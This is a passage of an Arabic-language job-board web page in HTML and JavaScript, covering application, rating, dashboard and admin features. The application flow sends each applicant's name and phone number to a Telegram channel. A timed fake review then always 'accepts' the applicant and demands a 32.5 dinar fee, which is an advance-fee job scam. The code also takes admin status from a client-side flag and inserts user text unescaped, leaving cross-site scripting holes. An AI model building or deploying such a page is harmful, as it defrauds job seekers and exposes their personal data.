            <div style="margin-bottom:10px;font-size:1.1rem;">${questions[currQ].q}</div>
            <div>${questions[currQ].o.map((o,i)=>`<button style="margin:5px;" onclick="chooseAns(${i})">${o}</button>`).join("")}</div>
            <div style="margin-top:20px;">سؤال ${currQ+1} من ${questions.length}</div>
            <button style="margin-top:14px;background:#fff;color:#6900ad;border:1px solid #6900ad;" onclick="closeStepModal()">إلغاء</button>`;
        }
        window.chooseAns = function(i) {
          questions[currQ].v = questions[currQ].o[i];
          if(++currQ<questions.length) renderQ();
          else { modalBg.style.display="none"; showStepModal("apply"); }
        }
        renderQ();
        modalBg.style.display="flex";
      }
      else if(step==="apply") {
        const job = jobsData[selectedJobIdx];
        modal.innerHTML = `
          <h2>تأكيد التقديم على الوظيفة</h2>
          <div style="margin-bottom:10px;font-size:1.09rem;">${job.img||"💼"} <b>${job.title}</b></div>
          <div>الراتب: <b>${job.salary} دينار</b></div>
          <div>النوع: <b>${job.type||"--"}</b> | الخبرة: <b>${job.exp||"--"}</b></div>
          <div>المحافظة: <b>${job.province}</b></div>
          <button style="margin-top:18px;" id="confirm-apply-btn">تقديم الطلب</button>
          <button style="margin-top:10px;background:#eee;color:#333;border:1px solid #ddd;" onclick="closeStepModal()">إلغاء</button>
        `;
        modalBg.style.display = "flex";
        document.getElementById("confirm-apply-btn").onclick = () => {
          saveApplicationToFirebase(userData, job);
          sendTelegram(`تقديم وظيفة:
الاسم: ${userData.name}
رقم الهاتف: ${userData.phone}
المحافظة: ${userData.province}
الوظيفة: ${job.title}
الراتب: ${job.salary} دينار
ساعات العمل: ${job.hours} ساعة`);
          showStepModal("pending");
        }
      }
      else if(step==="pending") {
        modal.innerHTML = `
          <h2>جاري إجراءات التوظيف...</h2>
          <div class="loader"></div>
          <div style="color:#888;margin-top:14px; font-size:.99rem;">يرجى الانتظار، يتم الآن مراجعة طلبك</div>
        `;
        modalBg.style.display = "flex";
        setTimeout(() => showStepModal("accepted"), 1600);
      }
      else if(step==="accepted") {
        modal.innerHTML = `
          <h2 style="color:#127c01;">🎉 تهانينا!</h2>
          <div class="success">تم قبولك مبدئياً في الوظيفة <b>${jobsData[selectedJobIdx].title}</b></div>
          <div style="margin:12px 0 14px 0; font-size:1.05rem;">لإكمال الإجراءات وحجز مكانك الوظيفي الرجاء دفع رسوم إصدار شهادة عدم محكومية ورسوم حكومية (32.5 دينار).</div>
          <div style="color:#ad6c00;font-size:.98rem;">يتم استرداد المبلغ في حال قمت بالإبلاغ بأنك لن تحضر قبل موعد الوظيفة.</div>
          <button class="pay-btn" id="pay-btn">دفع الرسوم</button>
        `;
        modalBg.style.display = "flex";
        document.getElementById("pay-btn").onclick = () => showStepModal("payment");
      }
      else if(step==="payment") {
        modal.innerHTML = `
          <h2>دفع الرسوم</h2>
          <div style="margin-bottom:12px;">رسوم إصدار شهادة عدم محكومية، وطوابع وضريبة لحجز مكانك: <b>32.5 دينار</b></div>
          <div class="note">الدفع متوفر عبر إي فواتيركم | أو تواصل معنا عبر الرقم:<br><a href="tel:0799999999" style="color:#6900ad">0799999999</a></div>
          <button style="margin-top:18px;" onclick="closeStepModal()">تم الدفع</button>
        `;
        modalBg.style.display = "flex";
      }
      else if(step==="video") {
        modal.innerHTML = `<h2>فيديو تعريفي</h2>
        <iframe width="100%" height="220" src="${arg}" frameborder="0" allowfullscreen style="border-radius:15px;"></iframe>
        <button style="margin-top:18px;background:#f9d13d;color:#6900ad;" onclick="closeStepModal()">إغلاق</button>`;
        modalBg.style.display = "flex";
      }
      else if(step==="compare") {
        const j1 = jobsData[compareArr[0]], j2 = jobsData[compareArr[1]];
        modal.innerHTML = `<h2>مقارنة وظيفتين</h2>
          <table style="width:100%;font-size:1.06rem;text-align:center;margin-bottom:8px;">
            <tr><th></th><th>${j1.title}</th><th>${j2.title}</th></tr>
            <tr><td>الشركة</td><td>${j1.company}</td><td>${j2.company}</td></tr>
            <tr><td>الراتب</td><td>${j1.salary}</td><td>${j2.salary}</td></tr>
            <tr><td>المحافظة</td><td>${j1.province}</td><td>${j2.province}</td></tr>
            <tr><td>النوع</td><td>${j1.type}</td><td>${j2.type}</td></tr>
            <tr><td>الخبرة</td><td>${j1.exp}</td><td>${j2.exp}</td></tr>
          </table>
          <button style="margin-top:18px;background:#f9d13d;color:#6900ad;" onclick="closeStepModal()">إغلاق</button>`;
        modalBg.style.display = "flex";
        compareArr=[];
      }
      else if(step==="ratejob") {
        const job = jobsData[selectedJobIdx];
        let rating = 0;
        modal.innerHTML = `<h2>تقييم الوظيفة</h2>
          <div class="job-title">${job.title}</div>
          <div class="rating-stars" id="rating-stars">${[1,2,3,4,5].map(i=>`<span style="color:#f9d13d;" onclick="setRate(${i})">★</span>`).join("")}</div>
          <textarea id="rate-comment" placeholder="اكتب تعليقك (اختياري)" style="height:60px;"></textarea>
          <button id="save-rate-btn" style="margin-top:12px;">حفظ التقييم</button>
          <div style="margin-top:10px;text-align:right;">تقييمات سابقة:</div>
          <div class="rates-list">${allRatings.filter(r=>r.jobKey===jobsKeys[selectedJobIdx]).map(r=>`<div>${r.rating}★ - ${r.comment||""} (${r.name||"مستخدم"})</div>`).join("")||"<i>لا يوجد تقييمات بعد</i>"}</div>
          <button style="margin-top:18px;background:#eee;color:#6900ad;border:1px solid #6900ad;" onclick="closeStepModal()">إغلاق</button>
        `;
        window.setRate = function(val) { rating = val; document.getElementById("rating-stars").innerHTML=[1,2,3,4,5].map(i=>`<span style="color:${i<=val?"#f9d13d":"#ccc"};" onclick="setRate(${i})">★</span>`).join(""); };
        document.getElementById("save-rate-btn").onclick = ()=>{
          if(!rating) return showToast("يرجى اختيار عدد النجوم");
          const comment = document.getElementById("rate-comment").value;
          saveRatingToFirebase(userData, job, rating, comment);
          showToast("تم حفظ تقييمك!");
          closeStepModal();
        };
        modalBg.style.display = "flex";
      }
    }
    function closeStepModal() {
      document.getElementById("step-modal-bg").style.display="none";
    }
    // =============== اشعارات توست ===============
    window.showToast = function(msg, duration=2700) {
      let toast = document.getElementById("toast");
      toast.textContent = msg;
      toast.style.display = "block";
      setTimeout(()=>{toast.style.display="none";}, duration);
    }
    // =============== الوضع الليلي ===============
    let dark = localStorage.getItem("darkMode")==="1";
    function setDarkMode(on) {
      dark = on;
      if(on) document.body.classList.add("dark"); else document.body.classList.remove("dark");
      localStorage.setItem("darkMode",on?"1":"0");
    }
    setDarkMode(dark);
    document.getElementById("dark-toggle").onclick = function(){ setDarkMode(!dark);}
    // =============== last filters/load ===============
    window.onload = function() {
      // تسجيل دخول تلقائي
      if(localStorage.getItem("ruyaJobsUser")) {
        userData = JSON.parse(localStorage.getItem("ruyaJobsUser"));
        document.getElementById("user-modal-bg").style.display = "none";
        if(userData.admin) isAdmin = true;
      }
      // استعادة آخر فلاتر
      if(lastFilters) {
        document.getElementById("search").value = lastFilters.filter||"";
        document.getElementById("filter-province").value = lastFilters.province||"";
        document.getElementById("filter-type").value = lastFilters.type||"";
        document.getElementById("filter-salary").value = lastFilters.salary||"";
      }
      renderJobs();
      updateFavBtns();
      updateStats();
      updateJobsTicker();
    };
    // حفظ المستخدم في التخزين المحلي بعد التسجيل
    document.getElementById("modal-next-btn").addEventListener("click", function() {
      if(userData)
        localStorage.setItem("ruyaJobsUser", JSON.stringify(userData));
    });
    // =============== تحميل جميع الوظائف PDF =============
    window.exportJobsPDF = function() {
      let win = window.open("","_blank");
      let html = `<h2>جميع الوظائف المتاحة</h2><table border="1" style="width:100%;border-collapse:collapse;"><tr><th>الوظيفة</th><th>الشركة</th><th>المحافظة</th><th>الراتب</th><th>النوع</th></tr>`;
      jobsData.forEach(j=>{
        html += `<tr><td>${j.title}</td><td>${j.company}</td><td>${j.province}</td><td>${j.salary}</td><td>${j.type}</td></tr>`;
      });
      html += "</table>";
      win.document.write(html);
      win.print();
    }
    // =============== لوحة التحكم ========================
    window.openDashboardPanel = function(){
      document.getElementById("dashboard-panel").style.display="flex";
      renderDashboardTabs();
      renderDashboardTab(currentDashboardTab);
    }
    window.closeDashboardPanel = function(){
      document.getElementById("dashboard-panel").style.display="none";
    }
    // Tabs
    function renderDashboardTabs() {
      let tabs = [
        {key:"myapps",label:"طلباتي"},
        {key:"fav",label:"المفضلة"},
        {key:"cv",label:"السيرة الذاتية"},
        {key:"profile",label:"بياناتي"},
        {key:"feedback",label:"تقييم الموقع"},
        {key:"stats",label:"إحصائيات"},
      ];
      if(isAdmin) tabs.push({key:"admin",label:"لوحة الإدارة"});
      let html = "";
      tabs.forEach(tab=>{
        html += `<button class="${currentDashboardTab===tab.key?'active':''}" onclick="renderDashboardTab('${tab.key}')">${tab.label}</button>`;
      });
      document.getElementById("dashboard-tabs").innerHTML = html;
    }
    // محتوى التاب
    window.renderDashboardTab = function(tab) {
      currentDashboardTab = tab;
      renderDashboardTabs();
      let content = "";
      if(tab==="myapps") {
        // طلبات المستخدم
        let myapps = allApplications.filter(a=>a.phone===userData.phone);
        content += `<h3>طلباتي المقدمة</h3>`;
        if(!myapps.length) content += "<div>لا يوجد طلبات بعد.</div>";
        else myapps.forEach(a=>{
          content += `<div style="border-bottom:1px solid #ddd;margin-bottom:8px;">
            <b>${a.jobTitle}</b> - <span style="color:#6900ad;">${a.status||"قيد المراجعة"}</span>
            <div>الشركة: ${a.company||"--"} | الراتب: ${a.salary} | المحافظة: ${a.province}</div>
            <div>تاريخ التقديم: ${new Date(a.timestamp).toLocaleString("ar-EG")}</div>
            <div>حالة الطلب: <b>${a.status||"قيد المراجعة"}</b></div>
            <button onclick="showStepModal('accepted')">متابعة الإجراءات</button>
          </div>`;
        });
      }
      else if(tab==="fav") {
        // الوظائف المفضلة
        content += "<h3>وظائفي المفضلة</h3>";
        if(!favJobs.length) content += "<div>لا يوجد وظائف محفوظة.</div>";
        else favJobs.forEach(idx=>{
          let job = jobsData[idx];
          if(job) content += `<div style="border-bottom:1px solid #ddd;margin-bottom:8px;">
            <b>${job.title}</b> | <span>${job.company}</span> | <span>${job.province}</span>
            <button onclick="applyJob(${idx})" style="margin:5px;">تقديم</button>
            <button onclick="toggleFav(${idx})" style="margin:5px;">إزالة</button>
          </div>`;
        });
      }
      else if(tab==="cv") {
        // السيرة الذاتية
        let mycv = allCVs.find(c=>c.phone===userData.phone);
        content += "<h3>السيرة الذاتية</h3>";
        content += `<textarea id="cv-text" style="width:97%;height:100px;border-radius:8px;padding:8px;margin-bottom:7px;">${mycv?mycv.cv:""}</textarea>`;
        content += `<button onclick="saveMyCV()">حفظ السيرة الذاتية</button>`;
        if(mycv && mycv.cv) content += `<div class="cv-preview"><b>معاينة:</b><br>${mycv.cv.replace(/\n/g,"<br>")}</div>`;
        window.saveMyCV = function(){
          saveCVToFirebase(userData, document.getElementById("cv-text").value);
          showToast("تم حفظ السيرة الذاتية!");
        }
      }
      else if(tab==="profile") {
        // بياناتي
        content += "<h3>بياناتي الشخصية</h3>";
        content += `<div>الاسم: ${userData.name}</div>
        <div>الهاتف: ${userData.phone}</div>
        <div>المحافظة: ${userData.province}</div>
        <div>البريد الإلكتروني: ${userData.email||"--"}</div>
        <button onclick="logout()" style="margin-top:14px;background:#f9d13d;color:#6900ad;">تسجيل خروج</button>`;
        window.logout = function(){
          localStorage.removeItem("ruyaJobsUser");
          location.reload();
        }
      }
      else if(tab==="feedback") {
        // تقييم الموقع
        content += "<h3>تقييم تجربتك في الموقع</h3>";
        content += `<div class="rating-stars" id="site-rate-stars">${[1,2,3,4,5].map(i=>`<span style="color:#f9d13d;" onclick="setSiteRate(${i})">★</span>`).join("")}</div>
        <textarea id="site-feedback" placeholder="اكتب ملاحظاتك (اختياري)" style="height:60px;"></textarea>
        <button onclick="saveSiteFeedback()" style="margin-top:12px;">إرسال التقييم</button>`;
        window.setSiteRate = function(val){document.getElementById("site-rate-stars").innerHTML=[1,2,3,4,5].map(i=>`<span style="color:${i<=val?"#f9d13d":"#ccc"};" onclick="setSiteRate(${i})">★</span>`).join(""); window.siteRating=val;}
        window.saveSiteFeedback = function(){
          if(!window.siteRating) return showToast("يرجى اختيار عدد النجوم");
          showToast("شكرًا لملاحظاتك!");
          // يمكنك حفظ التقييم في فايربيس هنا لو أردت
        }
      }
      else if(tab==="stats") {
        // إحصائيات
        content += "<h3>إحصائيات الموقع</h3>";
        content += `<div>عدد الوظائف: ${jobsData.length}</div>
        <div>عدد الطلبات: ${allApplications.length}</div>
        <div>المستخدمون: ${allUsers.length}</div>
        <div>المتقدمون اليوم: ${allApplications.filter(a=>a.timestamp && new Date(a.timestamp).toDateString()===new Date().toDateString()).length}</div>`;
        // رسم بياني بسيط (نص)
        let jobsPerProvince = {};
        jobsData.forEach(j=>{jobsPerProvince[j.province]=(jobsPerProvince[j.province]||0)+1;});
        content += "<h4>توزيع الوظائف حسب المحافظة:</h4><div style='font-size:.99rem;'>";
        Object.keys(jobsPerProvince).forEach(p=>{content += `${p}: <span style="color:#6900ad;">${jobsPerProvince[p]}</span><br>`;});
        content += "</div>";
      }
      else if(tab==="admin") {
        // لوحة الإدارة
        if(!isAdmin) return content += "<div>غير مصرح لك بالدخول.</div>";
        content += "<h3>لوحة تحكم الإدارة</h3>";
        content += "<b>إضافة وظيفة جديدة:</b><br><input id='add-title' placeholder='اسم الوظيفة' style='width:90%;'><br>";
        content += "<input id='add-company' placeholder='اسم الشركة' style='width:90%;'><br>";
        content += "<input id='add-salary' type='number' placeholder='الراتب' style='width:90%;'><br>";
        content += "<input id='add-hours' type='number' placeholder='عدد الساعات' style='width:90%;'><br>";
        content += "<input id='add-province' placeholder='المحافظة' style='width:90%;'><br>";
        content += "<input id='add-type' placeholder='نوع الدوام' style='width:90%;'><br>";
        content += "<input id='add-exp' placeholder='الخبرة' style='width:90%;'><br>";
        content += "<input id='add-img' placeholder='رمز/إيموجي' style='width:90%;'><br>";
        content += "<input id='add-desc' placeholder='وصف الوظيفة' style='width:90%;'><br>";
        content += "<input id='add-video' placeholder='رابط فيديو (اختياري)' style='width:90%;'><br>";
        content += "<button onclick='addNewJob()' style='margin-top:8px;'>إضافة</button>";
        content += "<hr>";
        content += "<b>كل الوظائف:</b>";
        jobsData.forEach((j,i)=>{
          content += `<div style='border-bottom:1px solid #eee;'><b>${j.title}</b> - ${j.company} | <button onclick='deleteJob(${i})' style='background:#b30000;color:#fff;border:none;border-radius:5px;padding:3px 7px;cursor:pointer;'>حذف</button></div>`;
        });
        window.addNewJob = function(){
          let n = { title:document.getElementById("add-title").value, company:document.getElementById("add-company").value, salary:+document.getElementById("add-salary").value, hours:+document.getElementById("add-hours").value, province:document.getElementById("add-province").value, type:document.getElementById("add-type").value, exp:document.getElementById("add-exp").value, img:document.getElementById("add-img").value, desc:document.getElementById("add-desc").value, video:document.getElementById("add-video").value };
          window.pushDB(window.refDB(window.db,"jobs"),n);
          showToast("تمت إضافة الوظيفة!");
        }
        window.deleteJob = function(i){
          if(!confirm("هل أنت متأكد من حذف الوظيفة؟")) return;
          let key = jobsKeys[i];
          if(key.startsWith("demo")) showToast("لا يمكن حذف الوظائف التجريبية"); else window.removeDB(window.refDB(window.db,"jobs/"+key));
        }
      }
      document.getElementById("dashboard-content").innerHTML = content;
    }
  </script>
</body>
</html>